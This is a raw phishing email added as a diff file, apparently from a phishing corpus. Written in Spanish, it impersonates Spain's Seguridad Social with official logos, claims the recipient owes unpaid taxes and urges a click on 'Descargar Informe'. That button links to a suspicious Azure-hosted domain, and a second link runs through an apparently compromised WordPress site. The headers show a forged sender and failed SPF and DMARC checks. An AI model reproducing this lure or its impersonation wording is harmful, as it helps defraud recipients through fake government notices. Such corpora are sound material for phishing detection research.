@@ -1,0 +1,159 @@
+From jose@monkey.org Tue Jun  6 19:00:26 2023 +0000
+Return-Path: root@qw22.conwaresul.com
+Delivered-To: jose@monkey.org
+X-FDA: 80873238852.18.6C5924B
+Received: from qw22.conwaresul.com (qw22.conwaresul.com [143.198.133.145])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 5F576C0007
+	for <jose@monkey.org>; Tue,  6 Jun 2023 19:00:25 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf06.b.hostedemail.com: domain of root@qw22.conwaresul.com has no SPF policy when checking 143.198.133.145) smtp.mailfrom=root@qw22.conwaresul.com;
+	dmarc=temperror reason="server fail" header.from=sistemasenseguridad.com (policy=temperror)
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1686078025;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=v5BKNCOvEe9Ud2q/QO8o+qfiH0Gjl9pGLyDIhvYZdLw=;
+	b=CEslYbtNPT8uyQ7UmqGOpFZNnIa1J0mLSWm7Crz/FgmxkuGtyEciMHT5CUFQzmtuW+MlUK
+	+DM40QL7KW+AXxy7jV87UCvWTI5XToUizCwlrwk8ADcluz8qoPJQNHEb/Hahv4jsMcGtKB
+	NwOVxrhDJy1gF1rEQ+AyTb36Zh7PJt8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1686078025; a=rsa-sha256;
+	cv=none;
+	b=7M4OkGkcLChEZt+34wvL6NbzqA0iQPC23PBFm4Q/XaQxJwjICT6xUK2AdQHHhTe2FrSIS7
+	xQG8rxKm4hgasXf1pFQ4ufEdVw6I0I3a6IIDWa+J3yQroVc865ucUgxmJLJTqjS81f3acy
+	zU56Dam8pYv2JlPagL+2kD2NZ4P5dok=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf06.b.hostedemail.com: domain of root@qw22.conwaresul.com has no SPF policy when checking 143.198.133.145) smtp.mailfrom=root@qw22.conwaresul.com;
+	dmarc=temperror reason="server fail" header.from=sistemasenseguridad.com (policy=temperror)
+Received: by qw22.conwaresul.com (Postfix, from userid 0)
+	id 3F8EF4519F; Tue,  6 Jun 2023 18:31:58 +0000 (UTC)
+To: jose@monkey.org
+Subject: Existen Obligaciones Tributaria   (575135)
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+From: Documentacion Importante<seg-social@sistemasenseguridad.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="8382e82dbca6db249939ba79c2daa34e"
+Content-Transfer-Encoding: 7bit
+Message-Id: <20230606184723.3F8EF4519F@qw22.conwaresul.com>
+Date: Tue,  6 Jun 2023 18:31:58 +0000 (UTC)
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=3.50
+X-Stat-Signature: 7fdtn875y16thah596p1ef1191et37zc
+X-Rspamd-Queue-Id: 5F576C0007
+X-HE-Tag: 1686078025-191515
+X-HE-Meta: U2FsdGVkX1864TTUetjhHC/6oCoErvxiVwpPtqF1AKNudU3QFns/7J+ZjvkYBxJ1SOhEoYB8xHyrOCZ6ZJSTnaMWJxXTA2Cj4eSni3czQsT6Xc6RavH1k/tOEBhRRdGrRG72sVSAbVCmpUaTCnWzFVePdA3wWO6fJ/4m8xBpl6IKT05e9U86PCY5Sb+MBBXyjQtfJc64bh/WiuUx+w3D/TxRe+6y6myUeSzRMgglO3E=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 150
+
+This is a MIME encoded message.
+
+--8382e82dbca6db249939ba79c2daa34e
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
+  <title>tgr</title>
+</head>
+
+<body style="color: rgb(0, 0, 0); background-color: white;" alink="#ee0000" link="#0000ee" vlink="#551a8b">
+<a href="https://www.piscinas-alkorplan.com/wp-content/languages/--/https:/www.inclusion.gob.es/?cliente=%email%"><span style="text-decoration: underline;"><img style="border: 0px solid ; width: 262px; height: 59px;" alt="" src="http://www.seg-social.es/wps/contenthandler/wss/%21ut/p/digest%21I09QqdexEzXA4cnnhWD_QQ/war/POINThemeStatic/themes/Portal8.5/css/img/logo-institucional.png"></span><img style="border: 0px solid ; width: 262px; height: 44px;" alt="" src="http://www.seg-social.es/wps/wcm/connect/wss/fb7c9eb6-87ec-449c-91c6-401cfd18a7dc/logo-ss-sedeElectronica.png?MOD=AJPERES&amp;CACHEID=ROOTWORKSPACE.Z18_9H5AH880M8TN80QOV0H20V0000-fb7c9eb6-87ec-449c-91c6-401cfd18a7dc-mfvMYuR"></a><br>
+
+<br style="font-weight: bold;">
+
+<big><span style="font-weight: bold; color: rgb(1, 62, 127);">Estimado(a) Contribuyente:</span></big><small style="color: rgb(1, 62, 127);"><br style="font-family: Verdana;">
+
+<br style="font-family: Verdana;">
+
+</small><span style="font-weight: bold; color: rgb(1, 62, 127);"><span style="font-family: Verdana;">SeguridadSocial</span></span><small style="color: rgb(1, 62, 127);"><span style="font-family: Verdana;"><span style="font-weight: bold;">:</span>
+Le informa que existen obligaciones, <br>
+
+Producto de una liquidacion
+tributaria que se encuentra impaga.<span style="font-weight: bold;"> </span></span></small><small style="color: rgb(1, 62, 127);"><span style="font-family: Verdana;">puede descargar <br>
+
+El informe generado por el <span style="font-weight: bold;">SII</span> en <span style="font-weight: bold;">el siguiente</span> <span style="font-weight: bold;">enlance</span>:</span></small><span style="color: rgb(1, 62, 127);"> <br>
+
+<br>
+
+
+<table style="margin: auto;" align="left" border="0" cellpadding="0" cellspacing="0">
+
+                        <tbody>
+    <tr>
+
+                          <td style="background: rgb(30, 10, 122) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; text-align: center;" class="button-td"><a href="http://classiceliteseguros.australiacentral.cloudapp.azure.com/" target="_blank" style="border: 15px solid rgb(30, 10, 122); padding: 0pt 10px; background: rgb(30, 10, 122) none repeat scroll 0% 50%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; color: rgb(255, 255, 255); font-family: sans-serif; font-size: 13px; line-height: 1.1; text-align: center; text-decoration: none; display: block; font-weight: bold;" title="Descargar" class="button-a"> 
+                            Descargar Informe 
+                            </a></td>
+
+                        </tr>
+
+                      
+  </tbody>
+</table>
+
+<br>
+
+<br>
+
+<br>
+
+<small style="color: white; font-weight: bold;">
+<br>
+
+</small>
+<div class="menuSecundario">
+<div id="footer" class="footer">
+<div class="footer01">
+<div class="footer_col_1">
+<div style="background-color: white; color: rgb(1, 62, 127); font-weight: bold;" class="footer_titulo2"><span style="font-family: Roboto,Arial,Helvetica,sans-serif; font-size: 14.4px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">Copyright. Seguridad Social 2023. Todos los derechos reservados</span></div>
+<small>
+                
+                </small></div>
+<small>  
+        </small></div>
+<small>
+    </small></div>
+<small>
+</small></div>
+
+
+        
+   
+
+</span>
+</body>
+</html>
